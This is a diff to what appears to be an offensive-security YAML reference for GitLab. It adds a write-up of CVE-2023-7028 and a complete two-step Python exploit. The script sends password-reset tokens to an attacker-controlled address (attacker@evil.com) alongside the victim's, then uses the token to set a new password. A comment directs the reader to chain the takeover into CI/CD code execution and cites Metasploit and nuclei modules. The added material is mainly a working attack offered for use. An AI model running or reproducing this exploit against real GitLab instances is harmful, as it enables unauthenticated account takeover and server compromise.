@@ -10,6 +10,14 @@ comment: |
   command injection in ExifTool's DjVu parser (CVE-2021-22204), achieving unauthenticated
   RCE as the `git` user on the GitLab server.
   Affects GitLab CE/EE 11.9 through 13.10.2 / 13.9.4 / 13.8.6.
+
+  CVE-2023-7028 (CVSS 10.0, CISA KEV): Password reset emails are sent to all addresses
+  supplied in the user[email][] array parameter, including unverified attacker-controlled
+  addresses. An unauthenticated attacker who knows a target's email address can take over
+  that account by supplying their own email alongside the victim's. If the victim is an
+  owner or admin, this chains directly into CI/CD pipeline code execution.
+  Affects GitLab CE/EE 16.1.0-16.1.5, 16.2.0-16.2.8, 16.3.0-16.3.6, 16.4.0-16.4.4,
+  16.5.0-16.5.5, 16.6.0-16.6.3, 16.7.0-16.7.1.
 docker:
   compose: "services:\n  gitlab:\n    image: gitlab/gitlab-ce:13.10.2-ce.0\n    ports:\n\
     \      - \"8080:80\"\n      - \"2222:22\"\n    environment:\n      GITLAB_OMNIBUS_CONFIG:\
@@ -110,6 +118,45 @@ functions:
       admin:
       console:
   rce:
+  - code: "# CVE-2023-7028: account takeover \u2192 CI/CD RCE chain (unauthenticated)\n\
+      # Step 1: extract CSRF token from the password reset form\npython3 - <<'EOF'\n\
+      import requests, re, sys\n\nTARGET       = \"http://victim.com\"\nTARGET_EMAIL\
+      \ = \"victim@company.com\"   # email of the account to hijack\nATTACKER_EMAIL\
+      \ = \"attacker@evil.com\"  # attacker-controlled email inbox\n\nsess = requests.Session()\n\
+      \n# Fetch CSRF token\nresp = sess.get(f\"{TARGET}/users/password/new\")\nm =\
+      \ re.search(r'name=\"authenticity_token\"\\s+value=\"([^\"]+)\"', resp.text)\n\
+      if not m:\n    sys.exit(\"[!] CSRF token not found \u2014 check TARGET URL\"\
+      )\ncsrf = m.group(1)\n\n# Send reset email to both victim and attacker\nr =\
+      \ sess.post(f\"{TARGET}/users/password\", data={\n    \"authenticity_token\"\
+      : csrf,\n    \"user[email][]\": [TARGET_EMAIL, ATTACKER_EMAIL],\n})\nif r.status_code\
+      \ in (200, 302):\n    print(\"[*] Reset emails dispatched to both addresses.\"\
+      )\n    print(\"[*] Check attacker's inbox for the reset link.\")\n    print(\"\
+      [*] Extract reset_password_token from the URL and run Step 2.\")\nelse:\n  \
+      \  print(f\"[!] Unexpected response: {r.status_code}\")\nEOF\n\n# Step 2: complete\
+      \ the reset with the token received in attacker's email\npython3 - <<'EOF'\n\
+      import requests, re, sys\n\nTARGET       = \"http://victim.com\"\nRESET_TOKEN\
+      \  = \"TOKEN_FROM_EMAIL\"   # paste token from the reset link\n\nsess = requests.Session()\n\
+      resp = sess.get(f\"{TARGET}/users/password/edit\",\n                params={\"\
+      reset_password_token\": RESET_TOKEN})\ncsrf = re.search(r'name=\"authenticity_token\"\
+      \\s+value=\"([^\"]+)\"', resp.text).group(1)\n\nr = sess.put(f\"{TARGET}/users/password\"\
+      , data={\n    \"authenticity_token\": csrf,\n    \"user[reset_password_token]\"\
+      : RESET_TOKEN,\n    \"user[password]\": \"NewP@ssw0rd!\",\n    \"user[password_confirmation]\"\
+      : \"NewP@ssw0rd!\",\n})\nprint(\"[*] Password reset. Login as the target user\
+      \ at:\", TARGET)\nEOF\n"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2023-7028:\
+      \ GitLab's password reset endpoint accepts multiple email addresses\nvia the\
+      \ user[email][] array parameter and sends the reset token to all of them\nwithout\
+      \ verifying ownership. An unauthenticated attacker supplies the victim's email\n\
+      alongside their own, receives the reset token, and sets a new password.\n\n\
+      No prior knowledge other than the victim's email address is required.\nIf the\
+      \ hijacked account has Owner or Admin privileges, chain immediately to CI/CD\n\
+      pipeline execution (see the ci_cd rce entry) for OS command execution on the\
+      \ Runner.\n\nExploit-DB: 51889\nnuclei: CVE-2023-7028\nMetasploit: use auxiliary/scanner/http/gitlab_cve_2023_7028\n\
+      Ref: https://about.gitlab.com/releases/2024/01/11/critical-security-release-gitlab-16-7-2-released/\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      16.1.0-16.1.5 / 16.2.0-16.2.8 / 16.3.0-16.3.6 / 16.4.0-16.4.4 / 16.5.0-16.5.5 / 16.6.0-16.6.3 / 16.7.0-16.7.1
   - code: |
       # Use the Metasploit module for automated payload generation and delivery:
       #   use exploit/multi/http/gitlab_exiftool_file_read_rce
